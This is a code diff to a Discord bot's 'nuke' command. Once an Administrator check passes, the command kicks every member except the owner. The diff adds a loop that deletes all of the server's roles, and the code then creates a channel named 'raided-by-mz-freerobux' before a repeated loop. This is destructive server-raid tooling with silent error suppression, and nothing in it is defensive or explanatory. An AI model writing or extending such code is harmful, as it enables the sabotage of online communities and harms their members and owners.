@@ -547,7 +547,6 @@ async def nuke_server_fr(ctx):
         print(str(ctx.author.id), "Tried to soft nuke THE ENTIRE SERVER by using .hardnuke_server")
         await ctx.send("You don't have `Administrator` Permissions!")
     else:
-       
         for member in ctx.guild.members:
             if member.id != ownerid:
                 try:
@@ -561,6 +560,7 @@ async def nuke_server_fr(ctx):
                     await member.kick(reason=random.choice(krlist))
                 except:
                     None
+         
                 
         if False:
             print(str(txt.author.id), "Tried to nuke channel:", txt.channel, "by using .nuke")
@@ -590,6 +590,12 @@ async def nuke_server_fr(ctx):
             finally:
                 None
             
+            for role in ctx.guild.roles:  
+                try:
+                    await role.delete()
+                except:
+                    continue
+                
             guild = ctx.message.guild
             newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
             for i in range(64):
